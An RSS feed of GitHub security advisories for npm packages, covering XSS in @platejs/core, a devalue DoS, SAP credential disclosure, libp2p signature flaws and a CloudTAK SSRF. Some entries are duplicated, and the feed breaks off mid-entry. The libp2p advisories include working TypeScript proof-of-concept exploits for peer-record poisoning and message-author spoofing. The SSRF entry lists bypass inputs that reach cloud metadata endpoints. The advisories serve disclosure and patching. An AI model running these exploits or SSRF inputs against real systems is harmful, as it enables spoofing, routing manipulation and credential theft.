<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-17T20:42:41.263Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@platejs/core] @platejs/core HTML deserialization can trigger browser behavior during parsing]]></title>
        <id>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</id>
        <link href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6"/>
        <updated>2026-09-17T20:32:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>HTML strings passed to Plate's core deserialization APIs were parsed in the active document. Certain HTML attributes could therefore trigger browser behavior during parsing, before the content was converted into editor nodes.</p>
<p>Applications that deserialize HTML from untrusted or cross-user sources may be affected.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can control HTML later deserialized in another user's browser may be able to execute script in that application's origin.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>@platejs/core</code> 53.3.11 or later. Users of the discontinued 54.0.0 beta builds should install the fixed stable line. Applications should also sanitize untrusted HTML before rendering it; inert parsing is not a substitute for sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88976">https://nvd.nist.gov/vuln/detail/CVE-2026-88976</a></li>
<li><a href="https://github.com/udecode/plate/pull/5117">https://github.com/udecode/plate/pull/5117</a></li>
<li><a href="https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b">https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.3.11">https://github.com/udecode/plate/releases/tag/v53.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@platejs/core] @platejs/core HTML deserialization can trigger browser behavior during parsing]]></title>
        <id>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</id>
        <link href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6"/>
        <updated>2026-09-17T20:32:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>HTML strings passed to Plate's core deserialization APIs were parsed in the active document. Certain HTML attributes could therefore trigger browser behavior during parsing, before the content was converted into editor nodes.</p>
<p>Applications that deserialize HTML from untrusted or cross-user sources may be affected.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can control HTML later deserialized in another user's browser may be able to execute script in that application's origin.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>@platejs/core</code> 53.3.11 or later. Users of the discontinued 54.0.0 beta builds should install the fixed stable line. Applications should also sanitize untrusted HTML before rendering it; inert parsing is not a substitute for sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88976">https://nvd.nist.gov/vuln/detail/CVE-2026-88976</a></li>
<li><a href="https://github.com/udecode/plate/pull/5117">https://github.com/udecode/plate/pull/5117</a></li>
<li><a href="https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b">https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.3.11">https://github.com/udecode/plate/releases/tag/v53.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[devalue] Svelte devalue: DoS via malformed input]]></title>
        <id>https://github.com/advisories/GHSA-9rgm-9g3h-6x36</id>
        <link href="https://github.com/advisories/GHSA-9rgm-9g3h-6x36"/>
        <updated>2026-09-17T20:28:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>devalue.parse</code> prior to version 5.9.2 fails to reject out-of-bounds indices. Specially-crafted payloads can exploit this to cause devalue to alternate between different array representations, resulting in work that is quadratic with payload size.</p>
<p>Applications are potentially affected if they call <code>devalue.parse</code> with untrusted data.</p>
<h3 id="patches">Patches</h3>
<p>The bug is fixed in <code>devalue@5.9.2</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/devalue/security/advisories/GHSA-9rgm-9g3h-6x36">https://github.com/sveltejs/devalue/security/advisories/GHSA-9rgm-9g3h-6x36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-81176">https://nvd.nist.gov/vuln/detail/CVE-2026-81176</a></li>
<li><a href="https://github.com/sveltejs/devalue/commit/8b2a4562c446d7c36d9d629778079a5fae4243e1">https://github.com/sveltejs/devalue/commit/8b2a4562c446d7c36d9d629778079a5fae4243e1</a></li>
<li><a href="https://github.com/sveltejs/devalue/releases/tag/v5.9.2">https://github.com/sveltejs/devalue/releases/tag/v5.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9rgm-9g3h-6x36">https://github.com/advisories/GHSA-9rgm-9g3h-6x36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9rgm-9g3h-6x36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:28:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@libp2p/peer-store] libp2p: PeerStore accepts attacker-signed PeerRecords for a victim peer ID and stores certified attacker addresses]]></title>
        <id>https://github.com/advisories/GHSA-vrf4-mx87-p53w</id>
        <link href="https://github.com/advisories/GHSA-vrf4-mx87-p53w"/>
        <updated>2026-09-17T18:01:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@libp2p/peer-store</code> accepts a signed <code>PeerRecord</code> whose envelope is signed by one peer but whose payload claims a different peer ID. The vulnerable <code>consumePeerRecord</code> path verifies the envelope signature, but does not verify that the envelope signer is the same peer as the wrapped <code>PeerRecord.peerId</code>. As a result, an attacker can sign a record with their own key while placing a victim peer ID in the payload, causing attacker-controlled multiaddrs to be stored as certified addresses for the victim.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code is in <code>packages/peer-store/src/index.ts</code>:</p>
<ul>
<li><code>RecordEnvelope.openAndCertify(buf, PeerRecord.DOMAIN, options)</code> verifies the envelope signature.</li>
<li><code>const peerId = peerIdFromCID(envelope.publicKey.toCID())</code> derives the envelope signer peer ID.</li>
<li>The optional <code>expectedPeer</code> check only compares <code>expectedPeer</code> to the envelope signer.</li>
<li><code>const peerRecord = PeerRecord.createFromProtobuf(envelope.payload)</code> decodes <code>peerRecord.peerId</code> from attacker-controlled signed payload bytes.</li>
<li><code>this.patch(peerRecord.peerId, { peerRecordEnvelope: buf, addresses: ... isCertified: true })</code> stores the addresses under the payload peer ID, not the verified signer peer ID.</li>
</ul>
<p>The missing invariant is:</p>
<pre><code class="language-ts">peerRecord.peerId.equals(peerIdFromCID(envelope.publicKey.toCID()))
</code></pre>
<p><code>packages/protocol-identify/src/utils.ts</code> already performs this check and can be used as the reference behavior:</p>
<pre><code class="language-ts">if (!peerRecord.peerId.equals(envelopePeer)) {
  throw new InvalidMessageError('signing key does not match PeerId in the PeerRecord')
}
</code></pre>
<p>The gossipsub Peer Exchange path reaches this code via <code>packages/gossipsub/src/gossipsub.ts</code> by calling:</p>
<pre><code class="language-ts">peerStore.consumePeerRecord(pi.signedPeerRecord, { expectedPeer: peer })
</code></pre>
<p>This does not prevent the bug because <code>peer</code> is derived from the wire <code>pi.peerID</code>. An attacker can set <code>pi.peerID</code> to their own peer ID, sign the envelope with their own key, and put the victim peer ID inside the wrapped <code>PeerRecord</code>.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">// TypeScript ESM PoC.
import { strict as assert } from 'node:assert'
import { generateKeyPair } from '@libp2p/crypto/keys'
import { defaultLogger } from '@libp2p/logger'
import { peerIdFromPrivateKey } from '@libp2p/peer-id'
import { PeerRecord, RecordEnvelope } from '@libp2p/peer-record'
import { persistentPeerStore } from '@libp2p/peer-store'
import { multiaddr } from '@multiformats/multiaddr'
import { MemoryDatastore } from 'datastore-core/memory'
import { TypedEventEmitter } from 'main-event'

const label = 'Certified peer-record address hijack'

async function main (): Promise&lt;void&gt; {
  const localKey = await generateKeyPair('Ed25519')
  const attackerKey = await generateKeyPair('Ed25519')
  const victimKey = await generateKeyPair('Ed25519')

  const attacker = peerIdFromPrivateKey(attackerKey)
  const victim = peerIdFromPrivateKey(victimKey)
  const attackerAddr = multiaddr('/ip4/203.0.113.66/tcp/4001')

  const peerStore = persistentPeerStore({
    peerId: peerIdFromPrivateKey(localKey),
    datastore: new MemoryDatastore(),
    events: new TypedEventEmitter(),
    logger: defaultLogger()
  })

  // Payload claims victim, but the envelope is signed by attacker.
  const forgedRecord = new PeerRecord({
    peerId: victim,
    multiaddrs: [attackerAddr],
    seqNumber: 999999n
  })
  const forgedEnvelope = await RecordEnvelope.seal(forgedRecord, attackerKey)

  // Emulates gossipsub PX: pi.peerID == attacker, expectedPeer == attacker.
  const accepted = await peerStore.consumePeerRecord(forgedEnvelope.marshal(), {
    expectedPeer: attacker
  })

  assert.equal(accepted, true)

  const poisonedVictim = await peerStore.get(victim)
  assert.deepEqual(poisonedVictim.addresses.map(({ multiaddr, isCertified }) =&gt; ({
    multiaddr: multiaddr.toString(),
    isCertified
  })), [{
    multiaddr: attackerAddr.toString(),
    isCertified: true
  }])

  console.log(`${label} reproduced`)
  console.log(`attacker signer: ${attacker}`)
  console.log(`victim storage key: ${victim}`)
  console.log(`stored certified address: ${attackerAddr}`)
}

main().catch(err =&gt; {
  console.error(err)
  process.exitCode = 1
})
</code></pre>
<p>Expected output:</p>
<pre><code class="language-text">Certified peer-record address hijack reproduced
attacker signer: 12D3KooWEdL1GaEhVGrhsKhubbiNQxWYTbX27ywm5JJ6W5Zh81gj
victim storage key: 12D3KooWCZBY7mRMDfuWSR9p4X6qJQgNyYXrrnzozW4zSUPSJUFn
stored certified address: /ip4/203.0.113.66/tcp/4001
</code></pre>
<h3 id="impact">Impact</h3>
<p>Attackers can poison peer-store certified address records for third-party peers. Certified addresses are preferred by dial address sorting, so future dials to the victim may attempt attacker-controlled or invalid endpoints. This can cause reachability disruption, address-book poisoning, and routing manipulation for applications that consume untrusted signed peer records.</p>
<p>This does not by itself let the attacker complete an encrypted libp2p connection as the victim, because the connection upgrade path still verifies the remote peer identity. The demonstrated impact is certified address poisoning and dial redirection/failure, not a full peer identity takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/pull/3570">https://github.com/libp2p/js-libp2p/pull/3570</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30">https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24">https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24</a></li>
<li><a href="https://github.com/advisories/GHSA-vrf4-mx87-p53w">https://github.com/advisories/GHSA-vrf4-mx87-p53w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrf4-mx87-p53w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T18:01:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@libp2p/gossipsub] libp2p: Gossipsub StrictSign accepts attacker-signed messages as a victim RSA peer ID]]></title>
        <id>https://github.com/advisories/GHSA-c3gv-825q-fvmp</id>
        <link href="https://github.com/advisories/GHSA-c3gv-825q-fvmp"/>
        <updated>2026-09-17T17:29:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@libp2p/gossipsub</code> <code>StrictSign</code> validation does not bind a supplied message public key to the claimed <code>from</code> peer ID when <code>from</code> is an RSA-style peer ID that does not inline its public key. An attacker can set <code>from</code> to a victim RSA peer ID, sign the message with the attacker's own private key, include the attacker's public key in <code>msg.key</code>, and have the message accepted as a valid signed message from the victim.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code is in <code>packages/gossipsub/src/utils/buildRawMessage.ts</code> inside <code>validateToRawMessage</code>.</p>
<p>When <code>msg.key</code> is present:</p>
<pre><code class="language-ts">publicKey = publicKeyFromProtobuf(msg.key)
if (fromPeerId.publicKey !== undefined &amp;&amp; !publicKey.equals(fromPeerId.publicKey)) {
  return { valid: false, error: ValidateError.InvalidPeerId }
}
</code></pre>
<p>For RSA peer IDs parsed from the wire <code>from</code> multihash, <code>fromPeerId.publicKey</code> is undefined because the RSA public key is not inlined in the peer ID. This means the key-to-<code>from</code> comparison is skipped. The code then verifies the signature with the attacker-supplied <code>msg.key</code> and returns a signed message whose <code>from</code> is the victim RSA peer ID.</p>
<p>The missing invariant is:</p>
<pre><code class="language-ts">peerIdFromPublicKey(publicKey).equals(fromPeerId)
</code></pre>
<p>This check must be performed whenever a public key is supplied, including keyless peer ID representations such as RSA peer IDs.</p>
<p><code>StrictSign</code> is the default gossipsub signature policy in <code>packages/gossipsub/src/gossipsub.ts</code>:</p>
<pre><code class="language-ts">this.globalSignaturePolicy = opts.globalSignaturePolicy ?? StrictSign
</code></pre>
<p>Version tracing:</p>
<ul>
<li><code>git blame</code> points the vulnerable <code>validateToRawMessage</code> block to <code>9a9b11fd44</code> (<code>fix!: remove pubsub (#3291)</code>), which introduced <code>packages/gossipsub/src/utils/buildRawMessage.ts</code>.</li>
<li>That commit's <code>packages/gossipsub/package.json</code> still reports <code>14.1.1</code>, but the first <code>gossipsub-v*</code> release tag in this checkout that contains the vulnerable block is <code>gossipsub-v15.0.0</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">// TypeScript ESM PoC.
import { strict as assert } from 'node:assert'
import { generateKeyPair, publicKeyToProtobuf } from '@libp2p/crypto/keys'
import { StrictSign } from '@libp2p/gossipsub'
import { peerIdFromPrivateKey } from '@libp2p/peer-id'
import { concat as uint8ArrayConcat } from 'uint8arrays/concat'
import { fromString as uint8ArrayFromString } from 'uint8arrays/from-string'
import { RPC } from '../../packages/gossipsub/dist/src/message/rpc.js'
import { SignPrefix, validateToRawMessage } from '../../packages/gossipsub/dist/src/utils/buildRawMessage.js'

const label = 'gossipsub StrictSign RSA author spoof'

function seqno (n: bigint): Uint8Array {
  const out = new Uint8Array(8)
  new DataView(out.buffer).setBigUint64(0, n, false)
  return out
}

async function main (): Promise&lt;void&gt; {
  const attackerKey = await generateKeyPair('Ed25519')
  const victimRsaKey = await generateKeyPair('RSA', 512)
  const victim = peerIdFromPrivateKey(victimRsaKey)

  const msg: RPC.Message = {
    from: victim.toMultihash().bytes,
    data: uint8ArrayFromString('forged as victim RSA peer'),
    seqno: seqno(1n),
    topic: 'poc-topic',
    signature: undefined,
    key: undefined
  }

  // Sign the protobuf message that claims victim in `from`, using attacker's key.
  const bytes = uint8ArrayConcat([SignPrefix, RPC.Message.encode(msg)])
  msg.signature = await attackerKey.sign(bytes)
  msg.key = publicKeyToProtobuf(attackerKey.publicKey)

  const result = await validateToRawMessage(StrictSign, msg)

  if (!result.valid) {
    throw new Error(`expected forged message to validate, got ${result.error}`)
  }

  assert.equal(result.message.type, 'signed')
  assert.equal(result.message.from.equals(victim), true)
  assert.equal(result.message.key.equals(attackerKey.publicKey), true)

  console.log(`${label} reproduced`)
  console.log(`claimed victim RSA author: ${victim}`)
  console.log('signature verified with attacker-supplied key')
}

main().catch(err =&gt; {
  console.error(err)
  process.exitCode = 1
})
</code></pre>
<p>Expected output:</p>
<pre><code class="language-text">gossipsub StrictSign RSA author spoof reproduced
claimed victim RSA author: QmcFsT6SHgxy1LXcUbz4aNSn9Wcj6JsJSMsSjB3ud1wT4f
signature verified with attacker-supplied key
</code></pre>
<h3 id="impact">Impact</h3>
<p>Attackers can forge gossipsub messages attributed to arbitrary victim RSA peer IDs under the default <code>StrictSign</code> policy. Applications that trust <code>message.from</code> in topic validators, authorization logic, accounting, moderation, reputation, or audit logs can be misled into treating attacker-controlled data as if it was authored by the victim.</p>
<p>The forged message can also be considered valid by gossipsub's validation path and forwarded to peers, spreading the incorrect origin attribution through the pubsub mesh.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-c3gv-825q-fvmp">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-c3gv-825q-fvmp</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/pull/3569">https://github.com/libp2p/js-libp2p/pull/3569</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/commit/cec2b1f349d130065e561349a0336a239528267f">https://github.com/libp2p/js-libp2p/commit/cec2b1f349d130065e561349a0336a239528267f</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v16.0.5">https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v16.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-c3gv-825q-fvmp">https://github.com/advisories/GHSA-c3gv-825q-fvmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3gv-825q-fvmp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T17:29:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tak-ps/cloudtak] TAK-PS-Stats Web UI: Authenticated full-read SSRF in CloudTAK basemap import (PUT /api/basemap) — no IP-classification guard]]></title>
        <id>https://github.com/advisories/GHSA-vqrw-qphh-p34v</id>
        <link href="https://github.com/advisories/GHSA-vqrw-qphh-p34v"/>
        <updated>2026-09-17T17:03:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>PUT /api/basemap</code> (the basemap import endpoint) fetches an attacker-supplied URL server-side with <strong>no SSRF protection whatsoever</strong>. Any authenticated user can submit a JSON body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>; the server calls <code>fetch(url)</code> against that URL and then reflects the response body (<code>name</code>, <code>attribution</code>, <code>tiles[0]</code>, zoom levels) back to the caller in the <code>OptionalTileJSON</code> response.</p>
<p>Because there is no IP-address classification, internal-only services are reachable: cloud metadata (<code>http://169.254.169.254/...</code>), loopback (<code>http://127.0.0.1/...</code>), RFC1918 ranges, and CGNAT. The response body flows back to the attacker, making this a <strong>full-read SSRF</strong> (not blind): the attacker reads the internal HTTP response verbatim. This enables theft of cloud instance credentials, internal service enumeration, and reading of internal-only HTTP endpoints from the network position of the CloudTAK API server.</p>
<p>The only URL check in the basemap protocol layer (<code>BasemapProtocol.isValidURL</code>, <code>api/lib/interface-basemap.ts</code>) validates the scheme is <code>http</code>/<code>https</code> only and performs <strong>no host/IP filtering</strong> — and the import path does not even call it; it goes straight from <code>new URL(rawURL)</code> to <code>fetch(url)</code>.</p>
<p>Three independent bypass classes were confirmed end-to-end against a real deployed build:</p>
<ol>
<li>Direct internal/loopback IP literals.</li>
<li>Alternate IP encodings (e.g. decimal <code>http://2130706433/</code> = <code>127.0.0.1</code>).</li>
<li>Redirect following — <code>fetch</code> uses the default <code>redirect: 'follow'</code>, so even a public initial host that 302-redirects to an internal address is followed with no re-validation.</li>
</ol>
<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
<p><code>api/routes/basemap.ts</code> — <code>importBasemapURL()</code> and the <code>PUT /basemap</code> handler (line numbers at commit <code>90d43bdd2fb7d9bd57cbce28c709d9e5207a475a</code>):</p>
<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136</a></p>
<pre><code class="language-ts">// api/routes/basemap.ts
async function importBasemapURL(
    config: Config,
    rawURL: string,
    auth?: Static&lt;typeof BasemapImportAuth&gt;,
): Promise&lt;Static&lt;typeof OptionalTileJSON&gt;&gt; {
    const imported: Static&lt;typeof OptionalTileJSON&gt; = { type: Basemap_Type.RASTER };

    let url: URL;
    try {
        url = new URL(rawURL);            // (1) only well-formedness is checked
    } catch (err) {
        throw new Err(400, err instanceof Error ? err : new Error(String(err)), 'Invalid URL');
    }

    if (isEsriLayerURL(String(url))) { /* ... ESRI proxy path ... */ }

    const tjres = await fetch(url);        // (2) SSRF sink — no host/IP guard, default redirect:follow
    if (!tjres.ok) throw new Err(400, null, 'Unable to fetch TileJSON from source URL');

    const tjbody = await tjres.json() as Record&lt;string, any&gt;;
    if (tjbody.name) imported.name = tjbody.name;               // (3) internal response reflected to caller
    if (tjbody.attribution) imported.attribution = tjbody.attribution;
    if (Array.isArray(tjbody.tiles) &amp;&amp; tjbody.tiles.length) {
        imported.url = tjbody.tiles[0]...;
    }
    return imported;
}
</code></pre>
<p>The handler at <code>api/routes/basemap.ts</code> L139–L233 mounts this as <code>PUT /api/basemap</code> and gates it only with <code>Auth.is_auth(config, req)</code> (L157), i.e. <strong>any authenticated user</strong> with <code>application/json</code> body <code>{ type, url }</code> reaches <code>importBasemapURL((req.body).url, (req.body).auth)</code>.</p>
<p><code>BasemapProtocol.isValidURL</code> at <code>api/lib/interface-basemap.ts</code> L136 — the only "validation" in the protocol layer — checks the scheme only and performs no IP filtering:</p>
<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148</a></p>
<h3 id="how-input-reaches-the-sink">How input reaches the sink</h3>
<ol>
<li>Attacker authenticates as any CloudTAK user (any role) and obtains a bearer token.</li>
<li>Attacker sends <code>PUT /api/basemap</code> with <code>Content-Type: application/json</code> and body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>.</li>
